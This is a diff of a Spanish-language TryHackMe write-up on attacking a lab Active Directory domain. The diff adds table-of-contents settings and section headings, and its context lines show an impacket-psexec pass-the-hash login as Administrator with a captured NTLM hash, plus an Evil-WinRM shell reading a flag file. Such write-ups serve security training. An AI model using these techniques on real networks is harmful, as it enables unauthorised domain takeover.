@@ -4,6 +4,9 @@ title: Attacktive Directory - TryHackMe
 excerpt: "En este Room de Tryhackme de dificultad media vamos a resolver un Entorno de Active Directory donde nos dicen que el 99 % de las redes empresariales se basan en Active Directory y hacen la pregunta que si se puede explotar un AD vulnerable, en el room te dan informacion de como instalar las herramientas de impacket , Bloodhound y Neo4j, pero no son necesarios ya que solo tendremos que utilizar herramientas de impacket y kerberos para ganar acceso al sistema"
 date: 2023-03-10
 classes: wide
+toc: true
+toc_label: "Contenido"
+toc_icon: "fire"
 header:
   teaser: /assets/images/try-writeup-ad/icon.png
   teaser_home_page: true
@@ -367,6 +370,7 @@ SMB         10.10.220.144   445    ATTACKTIVEDIREC  [+] spookysec.local\Administ
 
 Asi que ahora nos podemos conectar con `psexec` o con `evilwinrm` en mi caso para mi es mas comodo `evilwinrm` pero mostrare las 2 formas
 
+## Shell como Administrator 
 ```bash
 ❯ impacket-psexec WORKGROUP/Administrator@10.10.220.144 -hashes :0e0363213e37b94221497260b0bcb4fc
 Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra
@@ -443,6 +447,8 @@ Mode                LastWriteTime         Length Name
 ```
 
 `svc-admin`
+
+## Flags 
 
 ```bash
 *Evil-WinRM* PS C:\Users> type C:\Users\svc-admin\Desktop\user.txt.txt
